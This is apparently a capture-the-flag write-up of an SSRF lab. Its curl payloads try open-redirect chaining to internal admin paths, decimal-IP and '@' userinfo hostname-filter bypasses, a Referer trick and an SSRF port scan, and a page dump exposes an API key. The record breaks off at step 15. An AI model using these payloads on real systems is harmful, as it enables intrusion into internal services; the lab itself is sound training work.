# Task 3. New security layers in town! Let's break 'em in and see if they hold up!


## **Task Description**


Let's see if our security makeover is more than just a fresh coat of paint! Time to poke some holes and find out!\


This challenge focuses on the SSRF vulnerability within the check reduction functionality. Despite previous vulnerabilities, we've implemented new security measures. Now, it's time to see if they've done the job.\


Your mission is to test the new security layers: Attempt to exploit the SSRF vulnerability with the implementation of new security measures.

- Target Application: [ShopAdmin](https://intranet-dlh.hbtn.io/rltoken/U6QqlviZrwI8UHYl-XSfrw)
- Initial Endpoint: `http://web0x08.hbtn/app4-1/`

---

Useful instructions:

1. Log into ShopAdmin, it is a shopping website, there is a lot of article.
2. Navigate to Check Reduction Functionality: Explore the feature where the articleApi parameter is utilized.
3. There is New Feature To Navigate Product Now Trying Exploiting The Redirection in That  Feature
4. Try Using The New Feature  as refer in your payload to  Exploit The Vulnerability
5. Pay Attention To Other API Call to Backend Services & Port
6. This App is Forwarded on Port 8080



**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x08_ssrf`
- File: `3-flag.txt`



## **Solution**



- Start sandbox `cyber_websec_0x08`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.

```bash
echo "10.42.58.85 web0x08.hbtn" | sudo tee -a /etc/hosts
```


Let's start the same way we did in Tasks 1–2: find the current `articleApi` default value and locate this new "navigate product" feature mentioned in the hints.

**Step 1 — Browse to the Task 3 app and capture the check‑reduction request**

In your browser (Firefox with DevTools open, Network tab, filter **All**):

1. Navigate to:
   ```
   http://web0x08.hbtn/app4-1/
   ```
2. Click into any product page.
3. Look for a "Navigate Product" (or similarly named) feature/button on the product page — this is the new feature the task hints at.
4. Click **CHECK REDUCTION** as before, and capture the POST request body (the `articleApi` value) just like you did for task2 — right click → Copy as cURL if possible.

Please paste back:
- The default `articleApi` value shown in the check-reduction POST body
- Any URL/button/link related to "navigate product" / redirection feature you see on the page (its href, or the request it fires when clicked)

That'll tell us the allowed hostname for this app instance and what the redirect feature actually does.

Viewing the product page for product 1:

<img src="./web0x08.hbtn_app4-1_product_1.png" alt="web0x08.hbtn_app4-1_product_1" width="800" />

Clicking the "Check-Reduction" button leads to a POST request where the body shows the default `articleApi` value as:

```json
{
  "articleApi": "http://web0x08.hbtn:8080/app4-1/check-discount"
}
```

as curl command:

```bash
curl 'http://web0x08.hbtn/app4-1/check-discount' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://web0x08.hbtn' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'articleApi=http%3A%2F%2Fweb0x08.hbtn%3A8080%2Fapp4-1%2Fcheck-discount'

# No discount.
```

The "Next Product" button on the product page has the following href:

```
http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2
```

as curl command:

```bash
curl -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:03:14 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 78
# Connection: keep-alive
# X-Powered-By: Express
# Location: /app4-1/product/2
# Vary: Accept
#
# <p>Found. Redirecting to <a href="/app4-1/product/2">/app4-1/product/2</a></p>
```


Good find — the `nextProduct` redirector is almost certainly our bypass: `articleApi` is validated based on hostname, but if we point `articleApi` at this app's own open-redirect endpoint, and the redirect target lands on an internal address, the backend fetcher may blindly follow it without re-validating.

**Step 2 — Confirm the `nextProduct` endpoint is an open redirect (accepts arbitrary targets, not just internal paths)**

Run this in Kali:

```bash
curl -i -sS 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items'
```

and also try the decimal-localhost form in case absolute URLs get normalized differently:

```bash
curl -i -sS 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://2130706433:8080/admin/list-of-items'
```

**Output:**

```bash
curl -i -sS 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items'

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:09:03 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 63
# Connection: keep-alive
# X-Powered-By: Express
# Location: http://127.0.0.1:8080/admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to http://127.0.0.1:8080/admin/list-of-items
```

```bash
curl -i -sS 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://2130706433:8080/admin/list-of-items'

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:09:42 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 64
# Connection: keep-alive
# X-Powered-By: Express
# Location: http://2130706433:8080/admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to http://2130706433:8080/admin/list-of-items
```

Confirmed — it's a genuine open redirect with no destination validation at all. Now let's chain it: point `articleApi` at this redirector (hostname passes the filter since it's `web0x08.hbtn` itself), with `path` set to the internal admin endpoint.

**Step 3 — Exploit the SSRF via the redirect chain**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items'
```

If the backend fetcher doesn't follow redirects automatically, also try forcing the target through the decimal-IP form and the `/admin/dashboard` path as a secondary probe:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://2130706433:8080/admin/list-of-items'
```

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:14:11 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```


Both attempts return the generic `Error fetching discount data` rather than the earlier `Invalid hostname` message — that's actually informative: it likely means the hostname check passed (we're hitting a *different* failure), but the fetcher may not be *following* the 302 redirect automatically, and is instead failing to parse the redirect page itself as JSON/expected content.

Let's confirm that theory before chasing the wrong lead.

**Step 4 — Test whether the backend fetcher follows redirects at all**

Point `articleApi` at the redirector, but have it redirect back to a URL we *know* returns valid, parseable discount-check output (the app's own normal check-discount endpoint):

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn:8080/app4-1/check-discount'
```

- If this comes back with **"No reduction code found"** (the normal default response) → the fetcher *does* follow redirects, and our chain is fundamentally sound — we just need to find the right internal path/port for the admin panel.
- If it still comes back with **"Error fetching discount data"** → the fetcher does *not* follow redirects, and we need a different bypass approach (e.g. maybe `path` itself is passed straight to the backend fetch without an actual redirect hop, or there's a different parameter/technique this task wants).

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn:8080/app4-1/check-discount'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:20:06 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```


Good signal — even a self-redirect back to a known-good endpoint fails, which rules out "right endpoint, wrong admin path" and points instead at something more basic (redirects not followed, or a strict host:port match). Let's isolate which.

**Step 5 — Sanity checks on `articleApi` without any redirect involved**

Run these two:

```bash
# 1) Exact same host+port as the default value (should definitely succeed)
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/check-discount'
```

```bash
# 2) Same hostname, but WITHOUT the :8080 port (tests whether port must match exactly)
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/check-discount'
```

This will tell us whether the validator is pinned to `web0x08.hbtn:8080` exactly (in which case our redirector must be reached *through port 8080*, not port 80) or whether something else is going on.

**Output:**

```bash
# 1) Exact same host+port as the default value (should definitely succeed)
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/check-discount'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:22:11 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

```bash
# 2) Same hostname, but WITHOUT the :8080 port (tests whether port must match exactly)
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/check-discount'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:22:24 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```


Exact host+port and host-only both work, which rules out a strict port requirement, and confirms this challenge's filter is really just checking the **hostname string**, not actually validating what gets connected to. That's exactly the kind of bug a classic SSRF-via-URL-confusion bypass targets.

Let's try the userinfo (`@`) trick: craft a URL where the *validator* sees `web0x08.hbtn` as part of the string, but the *actual HTTP client* connects to `127.0.0.1:8080` instead (parser differential — naive validators do a substring/startswith check on the hostname, while a real URL parser treats everything before `@` as userinfo, not host).

**Step 6 — Test the `@` userinfo bypass**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn@127.0.0.1:8080/admin/list-of-items'
```

Also try the decimal-IP variant in case literal `127.0.0.1` is still blocked post-parse:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn@2130706433:8080/admin/list-of-items'
```

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn@127.0.0.1:8080/admin/list-of-items'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:26:54 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn@2130706433:8080/admin/list-of-items'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:27:03 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```

Interesting data point: both Step 3 and Step 4 produced byte-identical responses (same `Content-Length: 28`, same `ETag`), even though their redirect targets were completely different (one pointing at an internal admin path, the other pointing back at a known-good endpoint). That means the app isn't following the redirect at all — any non-200 response from `articleApi` triggers the same generic `Error fetching discount data`, regardless of where the `Location` header points. The open-redirect-as-SSRF-chain approach is a dead end as attempted.

Let's reinterpret the hint "**use the new feature as refer[er] in your payload**" literally — as the HTTP `Referer` header, not as the `articleApi` value itself. Maybe the hostname validation (or the backend routing) trusts a request as "internal-origin" based on the `Referer` header, so we pair a raw internal-IP `articleApi` with a `Referer` pointing at the trusted redirector feature.

**Step 7 — Test if `Referer` affects the hostname validation**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items' \
  --data-urlencode 'articleApi=http://127.0.0.1:8080/admin/list-of-items'
```

Checking if it still says `Invalid hostname`, or if it changes behavior (even a different error, or progress).

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin/list-of-items' \
  --data-urlencode 'articleApi=http://127.0.0.1:8080/admin/list-of-items'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:35:22 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```


Let's step back from the redirect chain — maybe the "security layer" here is purely a hostname allowlist of `web0x08.hbtn` itself, with no port restriction (we proved port doesn't matter). If so, the admin endpoint might just be reachable directly on `web0x08.hbtn:8080` — same trick as tasks 0–2, just using the app's own public hostname instead of `127.0.0.1` or an internal domain, since that hostname is implicitly "trusted."

**Step 8 — Probe the admin paths directly on `web0x08.hbtn:8080`**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/admin/list-of-items'
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/admin/list-of-items'
```

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:37:38 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 17:37:49 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI# "

# No discount.
```


Interesting results: pointing `articleApi` at `/admin/list-of-items` and `/app4-1/admin/list-of-items` on port 8080 gave the exact same `12`-byte `"No discount."` response (identical ETag) as the real `check-discount` self-call. That strongly suggests port 8080 doesn't actually serve an admin path — it's likely a single-purpose "discount" microservice that returns this same response regardless of path, meaning **the real admin/backend service in this task lives on a different port**, as hint #5 ("pay attention to other API calls to backend services & port") suggests.

We need to find that other port/service. Let's look at what other backend calls the site makes when browsing normally — something we haven't inspected yet.

**Step 9 — Browse normally and capture the full set of backend calls**

In the browser (Network tab, filter **All**, Persist Logs on):

1. On a product page, click through the tabs: **Features**, **Video**, **Articles (6)**, **Reviews (3)**.
2. Click **Wishlist** and **Compare** buttons.
3. Click the actual **Next Product** button (not curl) and let the new product page fully load.

Look through the Network tab for any XHR/fetch request (not just static JS/CSS/image loads) going to `web0x08.hbtn` with a **different port number** in the URL, or any JSON response that mentions an internal hostname/port (similar to how task0's default `articleApi` value leaked `internal-api.shop.com:3000`).

Paste back anything that stands out — especially any request whose URL or response body contains a port number other than 8080, or a different internal-sounding hostname.

**Outcome:**

1. clicking Features/Video/Articles/Reviews - no network activity
2. clicking Wishlist/Compare/Add - no network activity
3. clicking Next Product - loads the next product page, but no new XHR/fetch requests to a different port are observed. \
There are only 5 products, clicking the Next Product button on the 5th product leads to `http://web0x08.hbtn/app4-1/product/6` which returns `Product not found`.

This site seems to be a stub only to demonstrate the SSRF vulnerability.

No hidden backend calls on the frontend. Since the hostname filter only cares about the hostname string (and we've shown port is unrestricted), the real exploit is likely finding the **correct internal port** where the actual admin service listens — distinct from the 8080 "self" port, which seems to be a single-route stub (identical response regardless of path).

Let's use the SSRF itself as a port scanner: hostname stays `web0x08.hbtn` (always passes validation), we vary the port, and compare responses to find one that behaves differently (not the uniform `"No discount."` / `12-byte` response, and not a generic error).

**Step 10 — Probe a spread of candidate ports for the admin service**

First, a baseline for a definitely-closed port, so we know what "nothing there" looks like:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:9999/admin/list-of-items'
```

Then try this batch of candidates (run each, or loop them) — following the sequential-port pattern from tasks 0–2, plus common alternates:

```bash
for p in 3000 3001 3002 3003 3004 4000 5000 8000 8001 8081 8888 9000 9090; do
  echo "=== PORT $p ==="
  curl -sS -o - -w '\n[HTTP %{http_code}] size=%{size_download}\n' -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:$p/admin/list-of-items"
  echo
done
```

Paste back the full output — we're looking for any port whose response differs from the `9999` baseline and from the uniform `"No discount."`/`"Error fetching discount data"` responses we've seen so far.

**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:9999/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 19:33:00 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

```bash
for p in 3000 3001 3002 3003 3004 4000 5000 8000 8001 8081 8888 9000 9090; do
  echo "=== PORT $p ==="
  curl -sS -o - -w '\n[HTTP %{http_code}] size=%{size_download}\n' -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:$p/admin/list-of-items"
  echo
done

# === PORT 3000 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 3001 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 3002 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 3003 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 3004 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 4000 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 5000 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 8000 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 8001 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 8081 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 8888 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 9000 ===
# No discount.
# [HTTP 200] size=12
#
# === PORT 9090 ===
# No discount.
# [HTTP 200] size=12
```

This is a strong signal: even port `9999` (almost certainly closed) returns the identical `"No discount."` response. That means **all traffic to hostname `web0x08.hbtn`, regardless of port, is being funneled back to the same 8080 service** — exactly what hint #6 ("forwarded on port 8080") literally says. So varying the port while keeping this hostname is a dead end; we need a genuinely **different allowed hostname** — like task 2's discovery of `discount.newshop.tn` hiding behind the `web0x08.hbtn` facade.

Let's check whether other products expose a different backend hostname in their default `articleApi` (like task 2's per-app internal domain).

**Step 11 — Check the default `articleApi` value for other products**

In the browser, visit each product page and click **CHECK REDUCTION**, capturing the POST body's `articleApi` value each time (same as we did for product 1):

```
http://web0x08.hbtn/app4-1/product/2
http://web0x08.hbtn/app4-1/product/3
http://web0x08.hbtn/app4-1/product/4
http://web0x08.hbtn/app4-1/product/5
```

Paste back the `articleApi` default value shown for each product's check-discount request body. We're looking for any product whose default value uses a hostname other than `web0x08.hbtn` (that would be the real internal/backend domain this task wants us to discover and then abuse via the open-redirect or hostname trick).

| product |  `articleApi` value |
|---------|----------------------------|
| 1       | `http://web0x08.hbtn:8080/app4-1/check-discount` |
| 2       | `http://web0x08.hbtn:8080/app4-1/check-discount` |
| 3       | `http://web0x08.hbtn:8080/app4-1/check-discount` |
| 4       | `http://web0x08.hbtn:8080/app4-1/check-discount` |
| 5       | `http://web0x08.hbtn:8080/app4-1/check-discount` |

All products share the same self-referencing `articleApi` — so the "backend hostname leak" trick from task 2 isn't reproduced here; this app must hide the real target differently. Let's inspect the page source directly for clues the rendered page/network tab might not surface (hidden form fields, data attributes, JS logic around the "Next Product" button, or other endpoints referenced in scripts).

**Step 12 — Pull the raw product page HTML/JS and grep for clues**

```bash
curl -sS 'http://web0x08.hbtn/app4-1/product/1' -o /tmp/product1.html
grep -n -i -E 'articleApi|nextProduct|check-discount|backend|internal|api|admin|host' /tmp/product1.html
```

Also check if there's a distinct JS file specific to this app (not vendor libs like jquery/bootstrap) that might contain endpoint logic:

```bash
grep -n -oE '<script src="[^"]+"' /tmp/product1.html
```

For any non-vendor `.js` file found (something like `app4.js`, `product.js`, `main.js` specific to this app — skip jquery/bootstrap/fancybox/etc.), fetch it too:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/js/<FILENAME>.js' | grep -n -i -E 'articleApi|nextProduct|check-discount|host|port|api|admin'
```


**Output:**

- checking `product1.html`:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/product/1' -o /tmp/product1.html
grep -n -i -E 'articleApi|nextProduct|check-discount|backend|internal|api|admin|host' /tmp/product1.html
13:        name="stockApi"
14:        value="http://internal-api.checkstock.shop/1"
18:    <a href="/product/nextProduct?path=/product/2"
33:      href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700ii%7CRoboto:300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic"
242:              <form action="/app4-1/check-discount" method="post">
245:                  name="articleApi"
246:                  value="http://web0x08.hbtn:8080/app4-1/check-discount"
277:            <a href="/app4-1/product/nextProduct?path=/app4-1/product/2"
339:                  illo amet sapiente non repellat debitis dignissimos quod,
487:                          <a href="post.html">Non ex sapiente excepturi</a>
620:                      sapiente explicabo vero labore hic quo?
707:    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDhAYvx0GmLyN5hlf6Uv_e9pPvUT3YpozE"></script>
```

- checking scripts in `product1.html`:

```bash
grep -n -oE '<script src="[^"]+"' /tmp/product1.html

694:<script src="../js/jquery-1.11.2.min.js"
695:<script src="../js/jquery.bxslider.min.js"
696:<script src="../js/fancybox/fancybox.js"
697:<script src="../js/fancybox/helpers/jquery.fancybox-thumbs.js"
698:<script src="../js/jquery.flexslider-min.js"
699:<script src="../js/swiper.jquery.min.js"
700:<script src="../js/jquery.waypoints.min.js"
701:<script src="../js/progressbar.min.js"
702:<script src="../js/ion.rangeSlider.min.js"
703:<script src="../js/chosen.jquery.min.js"
704:<script src="../js/jQuery.Brazzers-Carousel.js"
705:<script src="../js/plugins.js"
706:<script src="../js/main.js"
707:<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDhAYvx0GmLyN5hlf6Uv_e9pPvUT3YpozE"
708:<script src="../js/gmap.js"
```

- checking `main.js`:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/js/main.js' | grep -n -i -E 'articleApi|nextProduct|check-discount|host|port|api|admin'

73:            'height': $($(this).attr('data-frpoptab')).find('.flex-viewport').outerHeight()+'px'
```

> **product1.html**: \
there's a **second, separate feature** on this page using a `stockApi` hidden field pointing to a totally different internal domain: `http://internal-api.checkstock.shop/1`. This is likely the "other API call to backend services" hint — a different endpoint/form than `check-discount`, possibly with weaker validation.

Let's get the full context around that form.

**Step 13 — Pull the full form surrounding `stockApi`**

```bash
sed -n '1,30p' /tmp/product1.html
```

**Output:**

```html
sed -n '1,30p' /tmp/product1.html

<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 1 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 1</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/1"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/2"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="format-detection" content="telephone=no" />
    <title>AllStore - MultiConcept eCommerce Template</title>
```


That's a commented-out legacy stub revealing a **second, separate endpoint**: `/check-stock` taking a `stockApi` parameter, pointing at a different internal domain (`internal-api.checkstock.shop`). This is very likely the actual weakly-protected backend call hint #5 refers to — a leftover feature that may not have the same hostname-allowlist hardening as `check-discount`.

**Step 14 — Test the `/check-stock` endpoint directly**

First, confirm the endpoint exists and behaves with its default value:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'
```

If that 404s, try without the `/app4-1` prefix (matches the stub's `action="/check-stock"`):

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'
```


**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'

# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 20:30:25 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'

# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 20:30:42 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```

The commented-out stub is dead code (literally inside an HTML comment), so it's not a live route on this app — but it may well reveal a legitimate "trusted" hostname (`internal-api.checkstock.shop`) that the `check-discount` validator was built to allow, separate from the self-referencing `web0x08.hbtn`. Let's test whether `articleApi` accepts that hostname.

**Step 15 — Test `internal-api.checkstock.shop` as the `articleApi` hostname**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop/1'
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop:8080/admin/list-of-items'
```


**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop/1'

